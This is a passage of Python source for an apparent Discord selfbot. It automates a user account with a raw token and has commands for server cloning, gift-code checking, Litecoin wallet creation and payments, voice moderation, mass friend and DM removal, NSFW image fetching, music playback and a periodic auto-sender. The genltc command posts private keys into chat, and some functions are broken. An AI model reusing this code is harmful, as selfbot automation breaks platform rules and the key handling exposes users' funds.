                    new_channel = await target_guild.create_text_channel(name=channel.name)
                elif isinstance(channel, discord.VoiceChannel):
                    new_channel = await target_guild.create_voice_channel(name=channel.name)
                    for overwrite in channel.overwrites:
                        if isinstance(overwrite.target, discord.Role):
                            target_role = target_guild.get_role(overwrite.target.id)
                            if target_role:
                                await new_channel.set_permissions(target_role, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                        elif isinstance(overwrite.target, discord.Member):
                            target_member = target_guild.get_member(overwrite.target.id)
                            if target_member:
                                await new_channel.set_permissions(target_member, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                    await asyncio.sleep(0)
        except Exception as e:
            print(f"error {e}")

############################################
#      Auto response Commands              #
############################################
def load_responses():
    global auto_responses
    if os.path.exists(responses_file):
        with open(responses_file, 'r') as file:
            auto_responses = json.load(file)

def save_responses():
    with open(responses_file, 'w') as file:
        json.dump(auto_responses, file, indent=4)

@bot.command()
async def setar(ctx, trigger_word: str, *, reply_msg: str):
    auto_responses[trigger_word.lower()] = reply_msg
    save_responses()  
    await ctx.send(f'Auto-response set: Trigger: "{trigger_word}", Reply: "{reply_msg}"')

@bot.command()
async def removear(ctx, trigger_word: str):
    trigger_word = trigger_word.lower()  
    if trigger_word in auto_responses:
        del auto_responses[trigger_word]
        save_responses()
        await ctx.send(f'Auto-response for trigger word "{trigger_word}" has been removed.')
    else:
        await ctx.send(f'No auto-response found for trigger word "{trigger_word}".')

@bot.command()
async def showar(ctx):
    if auto_responses:
        response_list = "\n".join([f'"{trigger}": "{response}"' for trigger, response in auto_responses.items()])
        await ctx.send(f"Current auto-responses:\n{response_list}")
    else:
        await ctx.send("No auto-responses set yet.")

############################################
#            Checker Commands              #
############################################
auth = {"Authorization": tknc}
r = requests.get("https://ptb.discord.com/api/v10/users/@me", headers=auth)
if r.status_code in [201, 204, 200]:
  pass
else:
  print("Invalid Token")
  sys.exit()

def save(file, data):
  with open(file, "a+") as f:
    f.write(data + "\n")

claimed_links = set()
valid_links = set()

#now = datetime.datetime.utcnow()

async def check(promocode):
    async with aiohttp.ClientSession(headers=auth) as cs:
        async with cs.get(f"https://ptb.discord.com/api/v10/entitlements/gift-codes/{promocode}") as rs:
            if rs.status in [200, 204, 201]:
                data = await rs.json()
                if data["uses"] == data["max_uses"]:
                    claimed_count += 1
                else:
                    now = datetime.datetime.utcnow()
                    exp_at = data.get("expires_at", "N/A").split(".")[0]
                    try:
                        parsed = parser.parse(exp_at)
                        days = abs((now - parsed).days)
                    except Exception:
                        days = "Failed To Parse!"
                    title = data.get("promotion", {}).get("inbound_header_text", "N/A")
                    valid_count += 1
            elif rs.status == 429:
                try:
                    deta = await rs.json()
                    timetosleep = deta["retry_after"]
                    print(f"Rate Limited For {timetosleep} Seconds!")
                    await asyncio.sleep(timetosleep)
                    await check(promocode)
                except:
                    print("Error fetching rate limit data.")
            else:
                invalid_count += 1

@bot.command()
async def checkpromo(ctx, *promo_links):
    await ctx.message.delete()
    for promo_link in promo_links:
        promo_code = promo_link.split('/')[-1]  
        async with aiohttp.ClientSession(headers=auth) as cs:
            async with cs.get(f"https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}") as rs:
                if rs.status in [200, 204, 201]:
                    data = await rs.json()
                    if data["uses"] == data["max_uses"]:
                        await ctx.send(f"> # <:Clear:1305955507546361958> Status: Claimed\n> <:linked:1305952731072168007> Promo Link: [Link]({promo_link})\n> <:44Question:1305952274274848779> Promo Type : N/A\n> <a:offcial_timer1:1305952107823763580> Expires in: N/A")
                    else:
                        now = datetime.datetime.utcnow()
                        exp_at = data.get("expires_at", "N/A").split(".")[0]
                        try:
                            parsed = parser.parse(exp_at)
                            days = abs((now - parsed).days)
                        except Exception:
                            days = "Failed To Parse!"
                        title = data.get("promotion", {}).get("inbound_header_text", "N/A")
                        match = re.search(r'(\d )', title)
                        if match:
                            month = match.group(1)  
                        else:
                            month = "1" 
                        await ctx.send(f"> # <:check:1305951941423009803> Status: Valid\n> <:linked:1305952731072168007> Promo Link: [Link]({promo_link}) ||{promo_link}||\n> <:44Question:1305952274274848779> Promo Type : {month}m promo\n> <a:offcial_timer1:1305952107823763580> Expires in: {days} days")
                elif rs.status == 429:
                    try:
                        deta = await rs.json()
                        timetosleep = deta["retry_after"]
                        print(f"Rate Limited For {timetosleep} Seconds!")
                        await asyncio.sleep(timetosleep)
                        await checkpromo(ctx, promo_link) 
                    except:
                        print("Error fetching rate limit data.")
                else:
                    await ctx.send(f"> # <:Clear:1305955507546361958> Status: Invalid\n> <:linked:1305952731072168007> Promo Link: [Link]({promo_link})\n> <:44Question:1305952274274848779> Promo Type : N/A\n> <a:offcial_timer1:1305952107823763580> Expires in: N/A")

############################################
#         LTC SENDER Commands              #
############################################

def load_wallets():
    if os.path.exists('wallet.json'):
        with open('wallet.json') as f:
            data = json.load(f)
            if isinstance(data, list):
                return data
    return []  

def save_wallets(wallets):
    with open('wallet.json', 'w') as f:
        json.dump(wallets, f, indent=2)

def get_ltc_to_usd_rate():
    try:
        response = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd")
        data = response.json()
        return data["litecoin"]["usd"]
    except requests.exceptions.RequestException:
        return 100  

def get_balance_info(address):
    url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance?token={api_token}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
    except requests.exceptions.RequestException:
        return {"balance": 0}  

def create_ltc_address():
    url = f"https://api.blockcypher.com/v1/ltc/main/addrs?token={api_token}"
    response = requests.post(url)
    if response.status_code == 201:
        data = response.json()
        return data["address"], data["private"], data["wif"]
    return None, None, None

@bot.command()
async def genltc(ctx):
        public_address, private_key, wif = create_ltc_address()

        if public_address:
            await ctx.send(
                f"🔑 **Litecoin Address** 🔑\n\n"
                f"**Public Address:** `{public_address}`\n"
                f"**Private Key:** `{private_key}`\n"  
            )

            wallet_data = {
                "public_address": public_address,
                "private_key": private_key,
                "wif": wif
            }

            wallets.append(wallet_data)
            save_wallets(wallets)

            await ctx.send(f"Wallet created and saved successfully.")
        else:
            await ctx.send("⚠️ Failed to create a Litecoin address. Please try again later.")

'''@bot.command()
async def withdraw(ctx, wallet_name: str, address: str, amount_usd: float):
    wallet_data = next((wallet for wallet in wallets if wallet["wallet_name"] == wallet_name), None)
    if not wallet_data:
        return await ctx.send(f"Wallet with name '{wallet_name}' not found.")
    
    private_key = wallet_data.get("private_key")
    if not private_key:
        return await ctx.send(f"No private key found for wallet '{wallet_name}'.")
    balance_info = get_balance_info(wallet_data['public_address'])
    confirmed_balance_ltc = balance_info['balance'] / 100000000 
    ltc_to_usd_rate = get_ltc_to_usd_rate()
    amount_ltc = amount_usd / ltc_to_usd_rate
    if confirmed_balance_ltc < amount_ltc:
        return await ctx.send(f"Insufficient funds. Available balance: {confirmed_balance_ltc:.5f} LTC.")
    transaction_url = f"https://api.blockcypher.com/v1/ltc/main/txs/new?token={api_token}"
    transaction_data = {
        "inputs": [{"addresses": [wallet_data["public_address"]]}],
        "outputs": [{"addresses": [address], "value": int(amount_ltc * 100000000)}]  
    }

    try:
        response = requests.post(transaction_url, json=transaction_data)
        tx_data = response.json()

        if response.status_code != 201 or 'tosign' not in tx_data:
            return await ctx.send(f"Error creating transaction: {tx_data.get('error', 'Unknown error')}")
        signed_data = [bitcoinlib.sign_message(tosign_part, private_key) for tosign_part in tx_data["tosign"]]
        tx_data["signatures"] = signed_data
        tx_data["pubkeys"] = [wallet_data["public_address"]]
        send_response = requests.post(
            f"https://api.blockcypher.com/v1/ltc/main/txs/send?token={api_token}",
            json=tx_data
        )
        send_data = send_response.json()

        if send_response.status_code == 201 and "tx" in send_data:
            txid = send_data["tx"]["hash"]
            await ctx.send(f"Successfully withdrew {amount_usd} USD (~{amount_ltc:.5f} LTC) from '{wallet_name}' to '{address}'.\nTransaction ID: {txid}")
        else:
            await ctx.send(f"Error sending transaction: {send_data.get('error', 'Unknown error')}")

    except Exception as e:
        await ctx.send(f"An error occurred while processing the transaction: {str(e)}")'''

@bot.command()
async def wallets(ctx):
    if not wallets:
        await ctx.send("No wallets found.")
    else:
        wallet_list = "\n".join([wallet["wallet_name"] for wallet in wallets])
        await ctx.send(f"**Wallet Names:**\n{wallet_list}")

@bot.command(aliases=["pay", "sendltc"])
async def send(ctx, addy: str, amount: str):
    try:
        if "$" in amount:
            amount = float(amount[1:])  
        else:
            amount = float(amount)
        if amount <= 0:
            await ctx.send("Amount must be greater than 0.")
            return
        r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd")
        r.raise_for_status()  
        ltc_to_usd = r.json()['litecoin']['usd']
        amount_in_ltc = round(amount / ltc_to_usd, 8)
        payload = {
            "inputs": [{"addresses": [ltc_addy]}],  
            "outputs": [{"addresses": [addy], "value": int(amount_in_ltc * 100000000)}],  
            "token": api_token  
        }
        tx_url = "https://api.blockcypher.com/v1/ltc/main/txs/new"
        tx_response = requests.post(tx_url, json=payload)
        tx_response.raise_for_status()
        transaction_data = tx_response.json()
        transaction_data['signatures'] = [ltc_priv_key]
        send_url = "https://api.blockcypher.com/v1/ltc/main/txs/send"
        send_response = requests.post(send_url, json=transaction_data)
        send_response.raise_for_status()
        await ctx.send(f"""
> # <:check:1305951941423009803> Transaction Successfully                     
> <:Money:1305993434351538196>  Sent: {amount}$ ({amount_in_ltc} LTC) 
> <:Members:1305993106457497612> To: {addy}"
> <:linked:1305952731072168007> Transaction ID: [Link]({send_response.json()['tx']['hash']})
""")
    except ValueError:
        await ctx.send("Invalid amount. Please provide a valid number.")
    except requests.exceptions.RequestException as e:
        await ctx.send(f"An error occurred while processing the request: {str(e)}")
    except Exception as e:
        await ctx.send(f"Unexpected error: {str(e)}")

@bot.command(aliases=['bal', 'ltcbal'])
async def getbal(ctx, ltcaddress):
    
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')
    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8  
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("Failed to retrieve balance. Please check the Litecoin address.")
        return
    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("Failed to retrieve the current price of Litecoin.")
        return
    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price
    message = (f"""
> # <a:ltc:1305940882582802472> WALLET INFO <a:ltc:1305940882582802472>            
> **<:LTC:1305994660073963530> LTC Address** `:` {ltcaddress}
> **<:prices:1305942191629271120> Current Bal** `:` {usd_balance:.2f}$
> **<:Cryptotocrypto_official:1305994531585392692> Total LTC Received** `:` {usd_total_balance:.2f}$
> **<a:load:1305941958967169054>  Unconfirmed LTC** `:` {usd_unconfirmed_balance:.2f}$
""")
    response_message = await ctx.send(message)
    await asyncio.sleep(60)
    await response_message.delete()

@bot.command()
async def mybal(ctx):
    
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltc_addy}/balance')
    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8  
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("Failed to retrieve balance. Please check the Litecoin address.")
        return
    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("Failed to retrieve the current price of Litecoin.")
        return
    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price
    message = (f"""
> # <a:ltc:1305940882582802472> WALLET INFO <a:ltc:1305940882582802472>            
> **<:LTC:1305994660073963530> LTC Address** `:` {ltc_addy}
> **<:prices:1305942191629271120> Current Bal** `:` ${usd_balance:.2f}$
> **<:Cryptotocrypto_official:1305994531585392692> Total LTC Received** `:` ${usd_total_balance:.2f}$
> **<a:load:1305941958967169054>  Unconfirmed LTC** `:` {usd_unconfirmed_balance:.2f}$
""")
    response_message = await ctx.send(message)
    await asyncio.sleep(60)
    await response_message.delete()

############################################
#            Selling Commands              #
############################################

def get_ltc_price():
    try:
        response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
        response.raise_for_status()
        return response.json()['litecoin']['usd']
    except Exception as e:
        print(f"Error fetching LTC price: {e}")
        return None
    
def get_exchange_rate():
    url = "https://api.exchangerate-api.com/v4/latest/EUR"  # EUR is the base currency
    response = requests.get(url)
    data = response.json()
    return data["rates"]

@bot.command()
async def etu(ctx, amount: float):
    rates = get_exchange_rate()
    usd_amount = amount * rates['USD']
    await ctx.send(f"{amount} EUR is equal to {usd_amount:.2f} USD")

@bot.command()
async def ute(ctx, amount: float):
    rates = get_exchange_rate()
    eur_amount = amount / rates['USD']
    await ctx.send(f"{amount} USD is equal to {eur_amount:.2f} EUR")

@bot.command(aliases=['addy'])
async def recieve(ctx):
	await ctx.send(f"{ltc_addy}\n")

@bot.command(aliases=['upiid'])
async def upi(ctx):
	await ctx.send(f"{upi_addy}\n")

@bot.command()
async def upiqr(ctx, amount: float):
    qr_data = f"upi://pay?pa={upi_addy}&pn=Airtel&am={amount}&cu=INR&tid=transactionid"
    qr = qrcode.make(qr_data)
    img_byte_arr = io.BytesIO()
    qr.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0) 
    await ctx.send(F"> UPI QR\n> FOR: {amount}₹", file=discord.File(img_byte_arr, filename='inr_qr.png'))

@bot.command()
async def ltcqr(ctx, amount: float):
    ltc_price = get_ltc_price()
    if ltc_price is None:
        await ctx.send("Unable to fetch LTC price. Please try again later.")
        return
    ltc_amount = amount / ltc_price
    qr_data = f"litecoin:{ltc_addy}?amount={ltc_amount:.6f}"
    qr = qrcode.make(qr_data)
    img_byte_arr = io.BytesIO()
    qr.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0) 
    await ctx.send(f"> LTC QR\n> FOR: {amount}$", file=discord.File(img_byte_arr, filename='ltc_qr.png'))

############################################
#                Vc Commands               #
############################################

@bot.command(name='vc247', aliases=['247'], brief="24/7 a vc", usage=".vc247 [on/off] <vc.channel.id>")
async def vc247(ctx, status: str, channel_id: int = None):
    global vc
    await ctx.message.delete()
    if status.lower() == "on" and channel_id:
        save_voice_channel(ctx.guild.id, channel_id)
        channel = bot.get_channel(channel_id)
        if isinstance(channel, discord.VoiceChannel):
            vc[ctx.guild.id] = await channel.connect()
            await ctx.send(f"Joined voice channel {channel.name} and will stay 24/7.")
        else:
            await ctx.send("This is not a valid voice channel ID.")

    elif status.lower() == "off":
        if ctx.guild.id in vc:
            await vc[ctx.guild.id].disconnect()
            del vc[ctx.guild.id]
            await ctx.send("Disconnected from voice channel and disabled 24/7 mode.")
        else:
            await ctx.send("Bot is not currently connected to a voice channel.")
    else:
        await ctx.send("Invalid command usage. Use .vc247 [on/off] <vc.channel.id>")

@bot.command(name='vckick', aliases=['vkick'], brief="Kicks vc user", usage=".vckick <mention.user>")
async def vckick(ctx, user: discord.Member):
    await ctx.message.delete()
    if await check_permissions(ctx, user):
        if user.voice and user.voice.channel:
            await user.move_to(None)

@bot.command(name='vcmoveall', aliases=['moveall'], brief="Moves all users to another vc", usage=".vcmoveall <from.channel.id> <to.channel.id>")
async def vcmoveall(ctx, channel1_id: int, channel2_id: int):
    await ctx.message.delete()
    channel1 = bot.get_channel(channel1_id)
    channel2 = bot.get_channel(channel2_id)
    if isinstance(channel1, discord.VoiceChannel) and isinstance(channel2, discord.VoiceChannel):
        members = channel1.members
        for member in members:
            if await check_permissions(ctx, member):
                await member.move_to(channel2)  

@bot.command(name='vcmute', aliases=['stfu'], brief="Mutes a vc user", usage=".vcmute <mention.user>")
async def vcmute(ctx, user: discord.Member):
    await ctx.message.delete()
    if await check_permissions(ctx, user):
        if user.voice and user.voice.channel:
            await user.edit(mute=True)

@bot.command()
async def vcunmute(ctx, member: discord.Member):
    if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
        await member.edit(mute=False)
        await ctx.send(f'{member.mention} has been unmuted.')
    else:
        await ctx.send('User is not in the same voice channel.')

@bot.command()
async def vcdeafen(ctx, member: discord.Member):
    if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
        await member.edit(deafen=True)
        await ctx.send(f'{member.mention} has been deafened.')
    else:
        await ctx.send('User is not in the same voice channel.')

@bot.command()
async def vcundeafen(ctx, member: discord.Member):
    if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
        await member.edit(deafen=False)
        await ctx.send(f'{member.mention} has been undeafened.')
    else:
        await ctx.send('User is not in the same voice channel.')

@bot.command()
async def vcmove(ctx, member: discord.Member, channel: discord.VoiceChannel):
    if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
        await member.move_to(channel)
        await ctx.send(f'Moved {member.mention} to {channel.name}.')
    else:
        await ctx.send('User is not in the same voice channel.')

@bot.command()
async def vcjoin(ctx, channel: discord.VoiceChannel):
    await ctx.author.move_to(channel)
    await ctx.send(f'{ctx.author.mention} joined {channel.name}.')

@bot.command()
async def vcleave(ctx):
    if ctx.author.voice:
        await ctx.author.move_to(None)
        await ctx.send(f'{ctx.author.mention} left the voice channel.')
    else:
        await ctx.send('You are not in a voice channel.')

@bot.command()
async def vcclear(ctx):
    if ctx.author.voice:
        for member in ctx.author.voice.channel.members:
            await member.kick()
        await ctx.send('Kicked all members from the voice channel.')
    else:
        await ctx.send('You need to be in a voice channel to use this command.')

@bot.command()
async def vcsetlimit(ctx, limit: int, channel: discord.VoiceChannel = None):
    channel = channel or ctx.author.voice.channel
    await channel.edit(user_limit=limit)
    await ctx.send(f'Set the user limit of {limit} for {channel.name}.')

@bot.command()
async def vcname(ctx, *, new_name: str):
    if ctx.author.voice:
        await ctx.author.voice.channel.edit(name=new_name)
        await ctx.send(f'Renamed the voice channel to {new_name}.')
    else:
        await ctx.send('You need to be in a voice channel to rename it.')

@bot.event
async def on_voice_state_update(member, before, after):
    global vc, channel_id
    if member.guild.id in vc:
        if member.id == bot.user.id and before.channel is not None and after.channel is None:
            channel = bot.get_channel(channel_id)
            if channel is not None:
                vc[member.guild.id] = await channel.connect()

############################################
#              User Commands               #
############################################

def mainHeader():
    return {
        "Authorization": token,
        "Content-Type": "application/json"
    }

@bot.command()
async def closealldms(ctx):
    await ctx.message.delete()
    dm_user_ids = []
    for dm in bot.private_channels:
        if isinstance(dm, discord.DMChannel):
            dm_user_ids.append(dm.id)
    tasks = [close_dm(channel_id) for channel_id in dm_user_ids]
    await asyncio.gather(*tasks)
    await ctx.send("**All DMs are being closed.**")

async def close_dm(channel_id):
    url = f"https://ptb.discord.com/api/v9/channels/{channel_id}"
    headers = mainHeader()
    response = requests.delete(url, headers=headers)

def remove_friend(user_id):
    url = f"https://canary.discord.com/api/v9/users/@me/relationships/{user_id}"
    response = requests.delete(url, headers=mainHeader())

    if response.status_code == 204:
        print(f"Removed friend {user_id}")
    else:
        print(f"Failed to remove friend {user_id}, status code: {response.status_code}")

async def get_friends():
    relationships = await bot.http.get_relationships()
    return [relationship['id'] for relationship in relationships if relationship['type'] == 1]

@bot.command()
async def delfriends(ctx):
    await ctx.message.delete()
    while True:
        friend_ids = await get_friends()
        if not friend_ids:
            break
        tasks = [remove_friend_async(friend_id) for friend_id in friend_ids]
        await asyncio.gather(*tasks)
        await asyncio.sleep(2)  
    await ctx.send("**All Friends Have Been Removed**")

async def remove_friend_async(user_id):
    await asyncio.to_thread(remove_friend, user_id)

@bot.command()
async def leaveallgroups(ctx):
    await ctx.message.delete()
    for channel in bot.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

############################################
#            Security Commands             #
############################################

@bot.command()
async def lockdown(ctx, status: str):
    owner = ctx.guild.owner
    if status.lower() == 'on':
        if bot.lockdown_mode:
            await ctx.send("Lockdown mode is already enabled.")
            return
        bot.lockdown_mode = True
        maint_channel = discord.utils.get(ctx.guild.channels, name='maintenance-🚧')
        if maint_channel is None:
            maint_channel = await ctx.guild.create_text_channel('maintenance-🚧')
        for channel in ctx.guild.channels:
            if channel != maint_channel:
                await channel.set_permissions(ctx.guild.default_role, view_channel=False)
                for role in ctx.guild.roles:
                    await channel.set_permissions(role, view_channel=False)
            else:
                await channel.set_permissions(owner, view_channel=True, send_messages=True)
        for role in ctx.guild.roles:
            if role != ctx.guild.default_role:
                await role.edit(permissions=role.permissions.update(create_instant_invite=False, connect=False))
        await ctx.send("Server lockdown enabled. All channels are hidden except for the maintenance channel, visible only to the server owner.")
    elif status.lower() == 'off':
        if not bot.lockdown_mode:
            await ctx.send("Lockdown mode is not enabled.")
            return
        bot.lockdown_mode = False
        for channel in ctx.guild.channels:
            await channel.set_permissions(ctx.guild.default_role, overwrite=None)
            for role in ctx.guild.roles:
                await channel.set_permissions(role, overwrite=None)
        for role in ctx.guild.roles:
            if role != ctx.guild.default_role:
                await role.edit(permissions=role.permissions.update(create_instant_invite=True, connect=True))
        maint_channel = discord.utils.get(ctx.guild.channels, name='🚧-maintenance')
        if maint_channel:
            await maint_channel.delete()
        await ctx.send("Server lockdown disabled. All channels are now visible.")
    else:
        await ctx.send("Invalid status. Use 'on' or 'off'.")

@bot.command()
async def kickallbots(ctx):
    members = ctx.guild.members
    bots = [member for member in members if member.bot]
    if not bots:
        await ctx.send("There are no bots to kick in this server.")
        return
    for bot_member in bots:
        try:
            await bot_member.kick(reason="Kicked by an administrator.")
            await ctx.send(f"Kicked bot: {bot_member.name}")
        except discord.Forbidden:
            await ctx.send(f"Failed to kick bot: {bot_member.name}. I don't have permission.")
        except discord.HTTPException as e:
            await ctx.send(f"Failed to kick bot: {bot_member.name}. Error: {str(e)}")
    if bots:
        await ctx.send(f"Successfully kicked {len(bots)} bot(s) from the server.")

@bot.command()
async def deleteallwebhooks(ctx):
    webhooks = await ctx.guild.webhooks()
    if not webhooks:
        await ctx.send("There are no webhooks to delete in this server.")
        return
    for webhook in webhooks:
        try:
            await webhook.delete()
            await ctx.send(f"Deleted webhook: {webhook.name}")
        except discord.Forbidden:
            await ctx.send(f"Failed to delete webhook: {webhook.name}. I don't have permission.")
        except discord.HTTPException as e:
            await ctx.send(f"Failed to delete webhook: {webhook.name}. Error: {str(e)}")

    if webhooks:
        await ctx.send(f"Successfully deleted {len(webhooks)} webhook(s) from the server.")

############################################
#              Nsfw Commands               #
############################################
async def fetch_image(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                response.raise_for_status()  
                data = await response.json()
                return data.get('message')  
    except Exception as e:
        print(f"Error fetching image: {e}")
        return None

@bot.command(name="hrandom", description="Random Image")
async def hrandom(ctx):
    url = "https://nekobot.xyz/api/image?type=hentai"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command(name="hass", description="Random hentai ass")
async def hass(ctx):
    url = "https://nekobot.xyz/api/image?type=hass"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command(name="ass", description="Random ass")
async def ass(ctx):
    url = "https://nekobot.xyz/api/image?type=ass"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command(name="cumm", description="Baby gravy!")
async def cumm(ctx):
    url = "https://nekobot.xyz/api/image?type=cum"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command(name="hblowjob", description="bot explainable")
async def blowjob(ctx):
    url = "https://nekobot.xyz/api/image?type=blowjob"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command(name="ahegao", description="Ahegao")
async def ahegao(ctx):
    url = "https://nekobot.xyz/api/image?type=ahegao"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command(name="spank", description="NSFW for butts")
async def spank(ctx):
    url = "https://nekobot.xyz/api/image?type=spank"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command(name="hwallpaper", description="99% SFW")
async def hwallpaper(ctx):
    url = "https://nekobot.xyz/api/image?type=wallpaper"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def erofeet(ctx):
    url = "https://nekobot.xyz/api/image?type=erofeet"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def anal(ctx):
    url = "https://nekobot.xyz/api/image?type=anal"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def feet(ctx):
    url = "https://nekobot.xyz/api/image?type=feet"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def hentai(ctx):
    url = "https://nekobot.xyz/api/image?type=hentai"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def boobs(ctx):
    url = "https://nekobot.xyz/api/image?type=boobs"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def tits(ctx):
    url = "https://nekobot.xyz/api/image?type=tits"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def blowjob(ctx):
    url = "https://nekobot.xyz/api/image?type=blowjob"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def lewdneko(ctx):
    url = "https://nekobot.xyz/api/image?type=lewdneko"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def lesbian(ctx):
    url = "https://nekobot.xyz/api/image?type=lesbian"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def cumslut(ctx):
    url = "https://nekobot.xyz/api/image?type=cumslut"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")

@bot.command()
async def waifu(ctx):
    url = "https://nekobot.xyz/api/image?type=waifu"
    image_url = await fetch_image(url)
    if image_url:
        await ctx.send(image_url)
    else:
        await ctx.send("An error occurred while fetching the image.")


@bot.command()
async def play(ctx: commands.Context, *, query: str) -> None:
    if not ctx.guild:
        return
    player = ctx.voice_client
    if not player:
        try:
            player = await ctx.author.voice.channel.connect(cls=wavelink.Player)
        except AttributeError:
            await ctx.send("Please join a voice channel first before using this command.")
            return
        except discord.ClientException:
            await ctx.send("I was unable to join this voice channel. Please try again.")
            return
    tracks = await wavelink.Playable.search(query)
    if not tracks:
        await ctx.send(f"{ctx.author.mention} - Could not find any tracks with that query. Please try again.")
        return
    if isinstance(tracks, wavelink.Playlist):
        added = await player.queue.put_wait(tracks)
        await ctx.send(f"Added the playlist {tracks.name} {added} songs to the queue.")
    else:
        track = tracks[0]
        await player.queue.put_wait(track)
        await ctx.send(f"Plaing {track.title}")
    if not player.playing:
        await player.play(player.queue.get(), volume=30)

@bot.command()
async def skip(ctx: commands.Context) -> None:
    player = ctx.voice_client
    if not player:
        return
    await player.skip(force=True)
    await ctx.message.add_reaction("\u2705")

@bot.command()
async def stop(ctx: commands.Context) -> None:
    player = ctx.voice_client
    if not player:
        return
    await player.skip(force=True)
    await ctx.message.add_reaction("\u2705")

@bot.command()
async def pause_resume(ctx: commands.Context) -> None:
    player = ctx.voice_client
    if not player:
        return
    await player.pause(not player.paused)
    await ctx.message.add_reaction("\u2705")

@bot.command()
async def volume(ctx: commands.Context, value: int) -> None:
    player = ctx.voice_client
    if not player:
        return
    await player.set_volume(value)
    await ctx.message.add_reaction("\u2705")

@bot.command(aliases=["dc"])
async def disconnect(ctx: commands.Context) -> None:
    player = ctx.voice_client
    if not player:
        return
    await player.disconnect()
    await ctx.message.add_reaction("\u2705")

class AutoSender:
    def __init__(self, channel, cooldown_time, message):
        self.channel = channel
        self.cooldown_time = cooldown_time
        self.message = message
        self.last_sent = None
        self.loop = None

    async def send_message_periodically(self):
        current_time = asyncio.get_event_loop().time()

        # Check if enough time has passed since the last message was sent
        if self.last_sent is None or current_time - self.last_sent >= self.cooldown_time:
            try:
                # Send the message to the channel
                await self.channel.send(self.message)
                self.last_sent = current_time
            except discord.Forbidden:
                print("Bot does not have permission to send messages in this channel.")
                self.stop()
            except discord.HTTPException as e:
                print(f"Error sending message: {e}")
                self.stop()

    def start(self):
        self.loop = tasks.loop(seconds=self.cooldown_time)(self.send_message_periodically)
        self.loop.start()

    def stop(self):
        if self.loop and not self.loop.is_being_cancelled():
            self.loop.cancel()

auto_senders = {}
@bot.command() 
async def startautosender(ctx, channel_id: int, cooldown_time: int, *, msg: str):
    try:
        channel = bot.get_channel(channel_id)
        if channel is None:
            raise ValueError("Channel not found or bot doesn't have access.")
